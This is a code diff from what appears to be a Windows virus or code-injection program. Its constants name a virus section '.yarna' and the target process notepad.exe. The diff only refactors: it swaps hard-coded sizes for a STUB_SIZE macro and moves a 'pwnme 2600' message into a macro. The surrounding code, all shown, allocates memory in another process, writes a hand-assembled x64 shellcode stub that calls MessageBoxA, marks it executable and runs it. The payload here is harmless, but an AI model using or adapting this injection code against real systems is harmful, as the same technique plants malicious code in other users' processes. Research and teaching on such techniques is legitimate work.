@@ -8,6 +8,8 @@
 #include <synchapi.h> 
 #define VIRUS_SECTION_NAME ".yarna"
 #define TARGET_PROCESS_NAME "notepad.exe"
+#define STUB_SIZE 64
+#define MESSAGE_TEXT "pwnme 2600"
 
 // Conditional debug logging
 #ifdef _DEBUG
@@ -304,7 +306,7 @@ static BOOL InjectPid(DWORD pid) {
     printf(" [DEBUG] OpenProcess succeeded: hProc=%p\n", hProc);
 
     // allocate and write our string
-    const char msg[] = "pwnme 2600";
+    const char msg[] = MESSAGE_TEXT;
     SIZE_T  msgLen = sizeof(msg);
     LPVOID  remoteMsg = VirtualAllocEx(hProc, NULL, msgLen,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -338,7 +340,7 @@ static BOOL InjectPid(DWORD pid) {
     //    slot3 @ +25:  MB_OK                (r9d)
     //    slot4 @ +35:  MessageBoxA address  (rax)
     //    slot5 @ +56:  ExitThread address   (rax)
-    BYTE stub[64] = {
+    BYTE stub[STUB_SIZE] = {
       0x48,0x31,0xC9,                         // xor    rcx,rcx
       0x48,0xBA, 0,0,0,0,0,0,0,0,             // mov    rdx,slot1
       0x49,0xB8, 0,0,0,0,0,0,0,0,             // mov    r8, slot2
@@ -360,7 +362,7 @@ static BOOL InjectPid(DWORD pid) {
     memcpy(stub + 56, &rExit, sizeof(rExit));    // slot5
 
     printf(" [DEBUG] stub bytes:\n    ");
-    for (int i = 0; i < 64; i++) {
+    for (int i = 0; i < STUB_SIZE; i++) {
         printf("%02X ", stub[i]);
         if ((i & 15) == 15) printf("\n    ");
     }
@@ -368,7 +370,7 @@ static BOOL InjectPid(DWORD pid) {
 
     // write & execute stub with better security practices
     // First allocate as PAGE_READWRITE, then change to PAGE_EXECUTE_READ
-    LPVOID remoteThunk = VirtualAllocEx(hProc, NULL, 64,
+    LPVOID remoteThunk = VirtualAllocEx(hProc, NULL, STUB_SIZE,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remoteThunk) {
         printf(" [ERROR] VirtualAllocEx failed: %lu\n", GetLastError());
@@ -376,7 +378,7 @@ static BOOL InjectPid(DWORD pid) {
         return FALSE;
     }
     
-    if (!WriteProcessMemory(hProc, remoteThunk, stub, 64, NULL)) {
+    if (!WriteProcessMemory(hProc, remoteThunk, stub, STUB_SIZE, NULL)) {
         printf(" [ERROR] WriteProcessMemory failed: %lu\n", GetLastError());
         CloseHandle(hProc);
         return FALSE;
@@ -385,7 +387,7 @@ static BOOL InjectPid(DWORD pid) {
     
     // Change memory protection to execute+read only
     DWORD oldProtect;
-    if (!VirtualProtectEx(hProc, remoteThunk, 64, PAGE_EXECUTE_READ, &oldProtect)) {
+    if (!VirtualProtectEx(hProc, remoteThunk, STUB_SIZE, PAGE_EXECUTE_READ, &oldProtect)) {
         printf(" [WARN] VirtualProtectEx failed: %lu\n", GetLastError());
         // Continue anyway as some processes might still work
     }
